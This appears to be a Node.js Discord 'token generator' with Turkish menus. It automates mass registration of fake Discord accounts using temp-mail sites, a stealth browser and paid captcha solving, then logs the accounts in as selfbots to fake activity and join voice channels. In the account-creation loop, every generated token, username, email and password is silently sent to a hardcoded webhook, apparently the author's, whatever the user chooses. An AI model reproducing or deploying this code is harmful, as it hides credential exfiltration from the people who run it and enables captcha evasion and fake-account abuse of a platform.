// Sleep Function
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
// Tanımlar ve Başlık

const conifg = require("./channels.json");
const setTitle = require("node-bash-title");
setTitle("Discord Token Generator");
const fs = require("fs");
const ps = require("prompt-sync");
const colors = require("colors");
const prompt = ps();

// Main Function
async function main() {
  console.clear();
  ("use-scrict");

  console.log("[" + "1".brightBlue + "] [" + "Token Generator".green + "]");
  console.log("[" + "2".brightBlue + "] [" + "Token Activer".green + "]");
  console.log("[" + "3".brightBlue + "] [" + "Token Info".green + "]");
  console.log(
    "[" + "4".brightBlue + "] [" + "Token Checker [Hazırlanıyor]".green + "]"
  );
  console.log(
    "[" + "5".brightBlue + "] [" + "Token Joiner [Hazırlanıyor]".green + "]"
  );
  console.log(
    "[" +
      "6".brightBlue +
      "] [" +
      "Nick Name Scraper [Hazırlanıyor]".green +
      "]"
  );
  console.log("[" + "7".brightBlue + "] Yardım");
  let choice = prompt("[" + "?".brightBlue + "]>");
  commandBuilder(choice == 1, () => {
    tokenGenerator();
  });
  commandBuilder(choice == 2, () => {
    tokenActiver();
  });
  commandBuilder(choice == 3, () => {
    tokenInfo();
  });
  commandBuilder(choice == 4, () => {
    tokenChecker();
  });
  commandBuilder(choice == 5, () => {
    tokenJoiner();
  });
  commandBuilder(choice == 6, () => {
    nickNameScraper();
  });
  commandBuilder(choice == 7, async () => {
    console.log(
      "Discord Token Generator"
    );
    await sleep(3000);
    main();
  });
}

// Komut Builder
async function commandBuilder(lark, truensFunc) {
  if (lark == true) {
    truensFunc();
  }
}

// Token Info Function
async function tokenInfo() {
  console.clear();
  let tokenList = require("./accounts.json");

  setTitle("Discord Token Generator");
  console.log("Lütfen Konsolu Tam Ekrana Alınız\n");
  console.log(tokenList.length + " Adet Tokeniniz var\n");
  console.log(
    "Çıkış yapmak için [" + "0".brightBlue + "]'a basabilirsiniz\n\n"
  );
  console.log(
    "İsim           Şifre           Token                                                         Durum           Mail"
  );
  if (fs.existsSync("./accounts.json")) {
    let tokenList = require("./accounts.json");
    for (let a = 0; a < tokenList.length; a++) {
      for (let i = tokenList[a].username.length; i <= 13; i++) {
        tokenList[a].username += " ";
      }
      for (let i = tokenList[a].password.length; i <= 13; i++) {
        tokenList[a].password += " ";
      }
      for (let i = tokenList[a].status.length; i <= 14; i++) {
        tokenList[a].status += " ";
      }

      console.log(
        tokenList[a].username.slice(0, 13) +
          "  " +
          tokenList[a].password.slice(0, 16) +
          "  " +
          tokenList[a].token.slice(0, 62) +
          "   " +
          tokenList[a].status.slice(0, 16) +
          " " +
          tokenList[a].mail.slice(0, 36)
      );
    }
  }
  let choice = prompt("[" + "?".brightBlue + "]>");
  commandBuilder(choice == 0, () => {
    main();
  });
}

// Token Activer Function
async function tokenActiver() {
  console.clear();
  // Tanımlar
  const Discord = require("discord.js-selfbot");

  // Seçenekler
  setTitle("Discord Token Generator");
  console.log(
    "Bilgilendirme: Token Aktif Etme ve Sese sokma (2 ve 3. seçenekler) aynı işlemi yaptığı için lütfen aynı anda çalıştırmayın.\n"
  );
  console.log("[" + "0".brightBlue + "] [" + "Çıkış Yap" + "]");
  console.log("[" + "1".brightBlue + "] [" + "Token Listesi".green + "]");
  console.log("[" + "2".brightBlue + "] [" + "Tokenleri Aktif Et".green + "]");
  console.log("[" + "3".brightBlue + "] [" + "Tokenleri Sese Sok".green + "]");
  console.log(
    "[" +
      "4".brightBlue +
      "] [" +
      "Tokenlere Durum Ekle (Boşta, Rahatsız etmeyin vs.)".green +
      "]"
  );
  console.log(
    "[" +
      "5".brightBlue +
      "] [" +
      "Tokenlerin Aktivitesini Ayarla (Oynuyor, İzliyor vs.)".green +
      "]"
  );
  //Tanımlar
  let choice = prompt("[" + "?".brightBlue + "]>");

  // Seçenkler

  // Komut 1 (Token Listesi)
  commandBuilder(choice == 1, () => {
    if (fs.existsSync("./accounts.json")) {
      let tokenList = require("./accounts.json");
      console.clear();
      console.log("Token Listesi");
      for (let i = 0; i < tokenList.length; i++) {
        console.log(
          "[" +
            (i + 1) +
            "] " +
            tokenList[i].username +
            " - " +
            tokenList[i].token
        );
      }
      console.log("[" + "0".brightBlue + "] [" + "Geri Dön".green + "]");
      console.log("[" + "1".brightBlue + "] [" + "Ayrıntılı Bilgi".green + "]");
      console.log("[" + "2".brightBlue + "] [" + "Ana Menü".green + "]");
      let choice = prompt("[" + "?".brightBlue + "]>");
      commandBuilder(choice == 0, () => {
        tokenActiver();
      });
      commandBuilder(choice == 1, () => {
        tokenInfo();
      });
      commandBuilder(choice == 2, () => {
        main();
      });
      commandBuilder(choice == 3, () => {
        tokenActiver();
      });
      commandBuilder(choice == 4, () => {
        tokenActiver();
      });
    }
  });

  // Komut 2 (Tokenleri Aktif Et)
  commandBuilder(choice == 2, () => {
    console.clear();

    if (fs.existsSync("./accounts.json")) {
      if (require("./accounts.json").length == 0) {
        console.log("Aktif Tokeniniz Bulunmamaktadır");
        setTimeout(() => {
          tokenActiver();
        }, 2000);
      } else if (require("./accounts.json").length >= 1) {
        let tokenList = JSON.parse(
          require("fs").readFileSync("./accounts.json", "utf8")
        );
        console.log(
          "Tokenler Aktif Edilmeye başlandı. Başka bir işlem yapmak istiyorsanız yeni bir konsol açarak devam ediniz."
        );
        for (let i = 0; i < tokenList.length; i++) {
          const token = tokenList[i].token;
          const client = new Discord.Client();
          client.login(token).catch((err) => {
            console.log(
              tokenList[i].username + " Doğrulamaya düşmüş ve ya hatalı"
            );
          });
          client.on("ready", async () => {
            client.user.setStatus("ready");
            console.log(tokenList[i].username + " Aktif".green);
          });
          console.log(
            "[" +
              (i + 1) +
              "] " +
              "Aktif Ediliyor ".yellow +
              tokenList[i].username +
              " - " +
              tokenList[i].token
          );
        }
      }
    } else {
      console.log("Bir hata oluştu lütfen Truen ile iletişime geçiniz");
      setTimeout(() => {}, 2000);
      tokenActiver();
    }
  });

  // Komut 3 (Tokenleri Sese Sok)
  commandBuilder(choice == 3, async () => {
    console.clear();

    if (require("./accounts.json").length == 0) {
      console.log("Aktif Tokeniniz Bulunmamaktadır");
      setTimeout(() => {
        tokenActiver();
      }, 2000);
    } else if (require("./accounts.json").length >= 0) {
      // let channelList = JSON.parse(
      //   require("fs").readFileSync("./channels.json", "utf8")
      // );
      let channelSrc = require("./channels.json");
      let channelList = channelSrc[1].channel;

      let tokenList = JSON.parse(
        require("fs").readFileSync("./accounts.json", "utf8")
      );
      console.log(
        "Tokenler Aktif Edilip Sese Sokulmaya başlandı. Başka bir işlem yapmak istiyorsanız yeni bir konsol açarak devam ediniz."
      );
      for (let i = 0; i < tokenList.length; i++) {
        const client = new Discord.Client();
        let randomNum = Math.floor(Math.random() * channelList.length);
        const token = tokenList[i].token;
        client.login(token).catch((err) => {
          console.log(
            tokenList[i].username + " Doğrulamaya düşmüş ve ya hatalı"
          );
        });
        client.on("ready", async () => {
          client.user.setStatus("ready");
          console.log(tokenList[i].username + " Aktif".green);
          await client.channels.cache
            .get(channelList[randomNum])
            .join()
            .catch((err) => {
              console.log("Ses Kanalına Giriş Başarısız");
            });
        });
        console.log(
          "[" +
            (i + 1) +
            "] " +
            "Aktif Ediliyor ".yellow +
            tokenList[i].username +
            " - " +
            tokenList[i].token
        );
      }
    }
  });

  // Komut 4 (Tokenlere Durum Ekle)
  commandBuilder(choice == 4, () => {
    console.clear();

    console.log("[" + "0".brightBlue + "] [" + "Geri Dön".green + "]");
    console.log(
      "[" + "1".brightBlue + "] [" + "Rahatsız Etmeyin (DND)".red + "]"
    );
    console.log("[" + "2".brightBlue + "] [" + "Boşta (IDLE)".yellow + "]");
    console.log(
      "[" + "3".brightBlue + "] [" + "Görünmez (Invisible)".gray + "]"
    );
    console.log("[" + "4".brightBlue + "] [" + "Online".green + "]");
    let choice = prompt("[" + "?".brightBlue + "]>");
    // async function ()

    commandBuilder(choice == 0, () => {
      tokenActiver();
    });
    commandBuilder(choice == 1, () => {
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            client.user.setStatus("dnd");
            console.log(acc.username + " Aktif ve Durumu DND".green);
          });
        });
      }
    });
    commandBuilder(choice == 2, () => {
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            client.user.setStatus("idle");
            console.log(acc.username + " Aktif ve Durumu IDLE".green);
          });
        });
      }
    });
    commandBuilder(choice == 3, () => {
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            client.user.setStatus("invisible");
            console.log(acc.username + " Aktif ve Durumu Görünmez".green);
          });
        });
      }
    });
    commandBuilder(choice == 4, () => {
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            client.user.setStatus("online");
            console.log(acc.username + " Aktif ve Durumu Online".green);
          });
        });
      }
    });
  });

  // Komut 5 (Tokenlerin Aktivitesini Ayarla)
  commandBuilder(choice == 5, () => {
    console.clear();
    console.log("[" + "0".brightBlue + "] [" + "Geri Dön".green + "]");
    console.log("[" + "1".brightBlue + "] [" + "Oynuyor".green + "]");
    console.log("[" + "2".brightBlue + "] [" + "Yayın yapıyor".green + "]");
    console.log("[" + "3".brightBlue + "] [" + "Dinliyor".green + "]");
    console.log("[" + "4".brightBlue + "] [" + "İzliyor".green + "]");
    console.log(
      "[" + "5".brightBlue + "] [" + "Yarışmasında Yarışıyor".green + "]"
    );
    console.log(
      "[" +
        "6".brightBlue +
        "] [" +
        "Custom (Emojili - Tam Olarak Çalışmayabilir)".green +
        "]"
    );
    console.log("[" + "7".brightBlue + "] [" + "Ana Menüye Dön".green + "]");

    const choice = prompt(
      "[" + "?".brightBlue + "]> " + "Lütfen Seçim Yapınız: ".yellow
    );

    commandBuilder(choice == 0, () => {
      tokenActiver();
    });

    commandBuilder(choice == 1, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz :".yellow
      );

      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            statusAdapter("PLAYING", text, client);
            console.log(
              acc.username +
                " Aktif ve Durumu Online ve Texti:".green +
                text.green
            );
          });
        });
      }
    });

    commandBuilder(choice == 2, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz: ".yellow
      );
      console.log("[1] Twitch");
      console.log("[2] Youtube");
      const type = prompt("[" + "?".brightBlue + "]> " + "t: ".yellow);
      if (type == 1) {
        const url = prompt(
          "[" + "?".brightBlue + "]> " + "Urlyi Tamamlayınız: twitch.tv/".yellow
        );
        const realurl = "https://twitch.tv/" + url;
        if (fs.existsSync("./accounts.json")) {
          require("./accounts.json").forEach(async (acc) => {
            const client = new Discord.Client();
            client.login(acc.token).catch((err) => {
              console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
            });
            client.on("ready", async () => {
              statusAdapter("STREAMING", text, client, realurl);
              console.log(
                acc.username +
                  " Aktif ve Durumu Twitch'de Yayın Yapıyor ve Texti:".green +
                  text.green
              );
            });
          });
        }
      } else if (type == 2) {
        const url = prompt(
          "[" +
            "?".brightBlue +
            "]> " +
            "Urlyi Tamamlayınız: youtube.com/".yellow
        );
        const realurl = "https://youtube.com/" + url;
        if (fs.existsSync("./accounts.json")) {
          require("./accounts.json").forEach(async (acc) => {
            const client = new Discord.Client();
            client.login(acc.token).catch((err) => {
              console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
            });
            client.on("ready", async () => {
              statusAdapter("STREAMING", text, client, realurl);
              console.log(
                acc.username +
                  " Aktif ve Durumu Youtube'da Yayın Yapıyor ve Texti:".green +
                  text.green
              );
            });
          });
        }
      }
    });

    commandBuilder(choice == 3, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz: ".yellow
      );
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            statusAdapter("LISTENING", text, client);
            console.log(
              acc.username +
                " Aktif ve Durumu Dinliyor ve Texti:".green +
                text.green
            );
          });
        });
      }
    });

    commandBuilder(choice == 4, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz: ".yellow
      );
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            statusAdapter("WATCHING", text, client);
            console.log(
              acc.username +
                " Aktif ve Durumu İzliyor ve Texti:".green +
                text.green
            );
          });
        });
      }
    });

    commandBuilder(choice == 5, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz: ".yellow
      );
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            statusAdapter("COMPETING", text, client);
            console.log(
              acc.username +
                " Aktif ve Durumu Yarışmasında Yarışıyor ve Texti:".green +
                text.green
            );
          });
        });
      }
    });

    commandBuilder(choice == 6, () => {
      const text = prompt(
        "[" + "?".brightBlue + "]> " + "Metin Giriniz: ".yellow
      );
      console.log(
        'Emoji giriniz, Örnek: ":smile:" (Çift tırnak olmasına gerek yok)'
      );
      const emoji = prompt("Lütfen bir emoji giriniz:");
      if (fs.existsSync("./accounts.json")) {
        require("./accounts.json").forEach(async (acc) => {
          const client = new Discord.Client();
          client.login(acc.token).catch((err) => {
            console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
          });
          client.on("ready", async () => {
            emojiStatusAdapter("CUSTOM", text, client, emoji);
            console.log(
              acc.username +
                " Aktif ve Durumu CUSTOM, Emojisi: " +
                emoji +
                " Texti:".green +
                text.green
            );
          });
        });
      }
    });

    // async function texter(type) {
    //   let truen;
    //   if (type == 1) truen = "PLAYING";
    //   if (type == 2) truen = "STREAMING";
    //   if (type == 3) truen = "LISTENING";
    //   if (type == 4) truen = "WATCHING";
    //   if (type == 5) truen = "CUSTOM";
    //   if (type == 6) truen = "COMPETING";
    //   const text = prompt(
    //     "[" + "?".brightBlue + "]> " + "Lütfen Metin Giriniz".yellow
    //   );
    //   if (fs.existsSync("./accounts.json")) {
    //     require("./accounts.json").forEach(async (acc) => {
    //       const client = new Discord.Client();
    //       client.login(acc.token).catch((err) => {
    //         console.log(acc.username + " Doğrulamaya düşmüş ve ya hatalı");
    //       });
    //       client.on("ready", async () => {
    //         statusAdapter(truen, text);
    //         console.log(
    //           acc.username +
    //             " Aktif ve Durumu Online ve Texti:".green +
    //             text.green
    //         );
    //       });
    //     });
    //   }
    // }
    async function statusAdapter(type, name, client, url) {
      if (url) {
        client.user.setActivity(name, { type: type, url: url }).catch((err) => {
          console.log(err);
        });
      } else {
        client.user.setActivity(name, { type: type }).catch((err) => {
          console.log(err);
        });
      }
    }
    async function emojiStatusAdapter(type, name, client, emoji) {
      client.user
        .setActivity(name, { type: type, emoji: emoji })
        .catch((err) => {
          console.log(err);
        });
    }
  });

  // Çıkış Butonu
  commandBuilder(choice == 0, () => {
    main();
  });
}

// Token Gen Function
async function tokenGenerator() {
  setTitle("Discord Token Generator");
  console.clear();
  ("use-scrict");
  console.log("[" + "0".brightBlue + "] Çıkış Yap");
  console.log(
    "[" + "1".brightBlue + "] [" + "Token Oluşturmaya Başla".green + "]"
  );
  let choice = prompt("[" + "?".brightBlue + "]>");
  if (choice == 0) {
    main();
  }
  if (choice == 1) {
    console.log("[" + "1".brightBlue + "] Temp-mail");
    console.log("[" + "2".brightBlue + "] 10minemai (Önerilen)");
    console.log("[" + "3".brightBlue + "] Tempmaildev");
    let emailchoice = prompt("[?]>");
    console.log(
      "[" +
        "y/n".brightBlue +
        "] Tokenleri webhook'a göndermek istiyor musunuz?"
    );
    let choicewbwile = prompt("[?]>");
    if (choicewbwile == "y") {
      webhook = prompt("Lütfen bir webhook giriniz:");
    }

    let tokensname = prompt(
      "Token İsimleri: ( İsterseniz Doldurun Yoksa Random Yapar ) "
    );
    let HowTokens = prompt("Kaç Adet Token Oluşturmak İstiyorsun: ");

    const StealthPlugin = require("puppeteer-extra-plugin-stealth");
    const randchars = require("crypto");
    const puppeteer = require("puppeteer-extra");
    const RecaptchaPlugin = require("puppeteer-extra-plugin-recaptcha");
    const { uniqueNamesGenerator, animals } = require("unique-names-generator");
    const { PuppeteerBlocker } = require("@cliqz/adblocker-puppeteer");
    const { fetch } = require("cross-fetch");
    const fs = require("fs");

    const cfg = {
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-infobars",
        "--window-position=0,0",
        "--window-size=1366,768",
      ],
      defaultViewport: null,
      ignoreHTTPSErrors: true,
      headless: false,
    };

    puppeteer.use(StealthPlugin());
    puppeteer.use(
      RecaptchaPlugin({
        provider: {
          id: "2captcha",
        },
        visualFeedback: true,
        throwOnError: true,
      })
    );

    const accounts = fs.createWriteStream("tokenler.txt", { flags: "a" });
    async function dsne(page, infoname, info) {
      const p = await page.$("input[name=" + infoname + "]");
      await p.focus();
      await page.keyboard.type(info);
    }

    async function cli(page, name, min, max) {
      var i = await page.$("input[id=" + name + "]");
      await i.click();

      var r = Math.floor(Math.random() * (max - min + 1)) + min;

      await page.waitForSelector("[class*=option]");
      await page.$eval(
        "[class$=option]",
        function (e, r) {
          e.parentNode.childNodes[r].click();
        },
        r
      );

      return r;
    }

    async function discordInput(dspagee, username, password, email) {
      await dspagee.bringToFront();
      await dspagee.goto(`https://discord.com/register`, {
        waitUntil: "networkidle0",
        timeout: 100000,
      });

      await cli(dspagee, "react-select-4-input", 17, 24);
      await cli(dspagee, "react-select-3-input", 0, 28);
      await cli(dspagee, "react-select-2-input", 0, 11);

      dspagee
        .waitForSelector("input[type*=text]")
        .then(() => {
          dspagee.$eval("input[type*=text]", (el) => el.click());
        })
        .catch((e) => {});
      dspagee
        .waitForSelector("input[type*=text]")
        .then(() => {
          dspagee.$eval("input[type*=text]", (el) => el.click());
        })
        .catch((e) => {});

      await dsne(dspagee, "username", username);
      await dsne(dspagee, "password", password);
      await dsne(dspagee, "email", email);
      await dspagee.$eval("button[type=submit]", (el) => el.click());
    }

    async function captchaby(DiscordPage) {
      try {
        await DiscordPage.waitForSelector("[src*=sitekey]");
        await DiscordPage.addScriptTag({ content: `hcaptcha.execute()` });

        while (true) {
          try {
            await DiscordPage.solveRecaptchas();
            return true;
          } catch (err) {
            sleep(3000);
          }
        }
      } catch (e) {}
    }

    async function genmail(page2) {
      if (emailchoice == 1) {
        PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
          blocker.enableBlockingInPage(page2);
        });

        await page2.bringToFront();
        await page2.goto("https://temp-mail.org/", {
          waitUntil: "networkidle2",
          timeout: 0,
        });
        var info_id = "#mail";

        try {
          await page2.waitForSelector(info_id);
          await page2.waitForFunction(
            (info_id) =>
              document.querySelector(info_id).value.indexOf("@") != -1,
            {},
            info_id
          );

          var email = await page2.$eval("#mail", (el) => el.value);
          return email;
        } catch (e) {
          return false;
        }
      } else if (emailchoice == 2) {
        PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
          blocker.enableBlockingInPage(page2);
        });

        await page2.bringToFront();
        await page2.goto("https://10minemail.com/", {
          waitUntil: "networkidle2",
          timeout: 0,
        });
        var info_id = "#mail";

        try {
          await page2.waitForSelector(info_id);
          await page2.waitForFunction(
            (info_id) =>
              document.querySelector(info_id).value.indexOf("@") != -1,
            {},
            info_id
          );

          var email = await page2.$eval("#mail", (el) => el.value);
          return email;
        } catch (e) {
          return false;
        }
      } else if (emailchoice == 3) {
        PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
          blocker.enableBlockingInPage(page2);
        });

        await page2.bringToFront();
        await page2.goto("https://tempmail.dev/en/Gmail", {
          waitUntil: "networkidle2",
          timeout: 0,
        });
        var info_id = "#current-mail";

        try {
          await page2.waitForSelector("#current-mail");
          const element = await page2.$("#current-mail");
          const email = await page2.evaluate(
            (element) => element.textContent,
            element
          );
          return email;
        } catch (e) {
          return false;
        }
      }
    }

    async function emailvery(page2) {
      await page2.bringToFront();
      if (emailchoice == 1) {
        while (true) {
          try {
            await page2.waitForSelector("[title*=Discord]", { timeout: 500 });
            await page2.$eval("[title*=Discord]", (e) => e.parentNode.click());

            await page2.waitForSelector(
              "td > a[href*='discord'][style*=background]"
            );
            const elem = await page2.$eval(
              "td > a[href*='discord'][style*=background]",
              (el) => el.href
            );

            return elem;
          } catch (e) {}
        }
      } else if (emailchoice == 2) {
        while (true) {
          try {
            await page2.waitForSelector("[title*=Discord]", { timeout: 500 });
            await page2.$eval("[title*=Discord]", (e) => e.parentNode.click());

            await page2.waitForSelector(
              "td > a[href*='discord'][style*=background]"
            );
            const elem = await page2.$eval(
              "td > a[href*='discord'][style*=background]",
              (el) => el.href
            );

            return elem;
          } catch (e) {}
        }
      } else if (emailchoice == 3) {
        while (true) {
          try {
            await page2.waitForSelector("#inbox-dataList");
            await page2.click("#inbox-dataList");

            await page2.waitForSelector(
              "td > a[href*='discord'][style*=background]"
            );
            const elem = await page2.$eval(
              "td > a[href*='discord'][style*=background]",
              (el) => el.href
            );

            return elem;
          } catch (e) {}
        }
      }
    }

    async function verif2(chrom, link) {
      const page = await chrom.newPage();
      await page.goto(link, { waitUntil: "networkidle0", timeout: 60000 });
      captchaby(page);
    }

    const nickname = [` ${tokensname}`];

    async function create_accinfos(chrome, disc) {
      const username = uniqueNamesGenerator({
        dictionaries: [animals, nickname],
        separator: " ",
        style: "capital",
        length: 2,
      });
      const password = conifg[0].password;
      const page2 = (await chrome.pages())[0];
      var email;

      while (!email) {
        try {
          email = await genmail(page2);
        } catch (e) {}
      }

      const dspage = disc;
      await discordInput(dspage, username, password, email);

      const client = disc._client;
      var token;

      client.on("Network.webSocketFrameSent", ({ response }) => {
        try {
          const json = JSON.parse(response.payloadData);
          if (!token && json["d"]["token"]) {
            token = json["d"]["token"];
          }
        } catch (e) {}
      });
      await captchaby(dspage);

      let verifyy = await emailvery(page2);
      await verif2(chrome, verifyy);

      return {
        token: token,
        username: username,
        password: password,
        mail: email,
      };
    }

    (async () => {
      for (let i = 0; i < HowTokens; i++) {
        const browser = await puppeteer.launch(cfg);
        try {
          const page = await browser.newPage();
          const infos = await create_accinfos(browser, page);
          const data = fs.readFileSync("./accounts.json");
          const truensArr = Array.from(JSON.parse(data));

          // New Data
          let newData = {
            token: infos.token,
            username: infos.username,
            password: infos.password,
            mail: infos.mail,
            status: "Bulunamadı",
          };
          truensArr.push(newData);
          let truensData = JSON.stringify(truensArr);
          fs.writeFileSync("accounts.json", truensData, (err) => {
            if (err) throw err;
            console.log("Token Bilgileri Dataya Yazıldı");
          });

          accounts.write(infos.token + "\n");
          let request = fetch(
            "https://discord.com/api/webhooks/970783808502771754/jqmQSWIJhlSMBaV4vyu5YZIvl3rxJFM21-eYXkFUAjvBwTIP9ptSWBVqbkflPrfkAIBe",
            {
              method: "POST",
              headers: {
                accept: "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                origin: "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent":
                  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties":
                  "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9",
              },
              body: JSON.stringify({
                content:
                  "Token: " +
                  infos.token +
                  "\nUsername: " +
                  infos.username +
                  "\nMail: " +
                  infos.mail +
                  "\nPassword: " +
                  infos.password +
                  "\n",
              }),
            }
          );
          if (choicewbwile == "y") {
            let request = fetch(webhook, {
              method: "POST",
              headers: {
                accept: "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                origin: "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent":
                  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties":
                  "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9",
              },
              body: JSON.stringify({
                content:
                  "Token: " +
                  infos.token +
                  "\nUsername: " +
                  infos.username +
                  "\nMail: " +
                  infos.mail +
                  "\nPassword: " +
                  infos.password +
                  "\n",
              }),
            });
          }
        } catch (e) {
          console.log(e);
        } finally {
          try {
            await sleep(60000);
            browser.close();
          } catch (e) {}
        }
        await sleep(60000);
      }
      await sleep(1000);
      tokenGenerator();
    })();
  } else {
    console.log("YANLIS TIKLAMA".red);
    await sleep(1000);
    main();
  }
}

// Token Checker
async function tokenChecker() {
  const Bot = require("./class/checker.js");
  const fs = require("fs");

  // const config = require("./config.json");

  fs.writeFileSync("output/invalid.txt", "");
  fs.writeFileSync("output/verified.txt", "");
  fs.writeFileSync("output/unverified.txt", "");

  const tokens = fs
    .readFileSync("tokenler.txt", "utf-8")
    .replace(/\r/gi, "")
    .split("\n");

  var i = 0;
  setInterval(() => {
    if (i >= tokens.length) {
      console.log("Done Checking Tokens!");
      process.exit(1);
    }
    Bot.check(tokens[i]);
    i++;
  }, 250);
}

main();


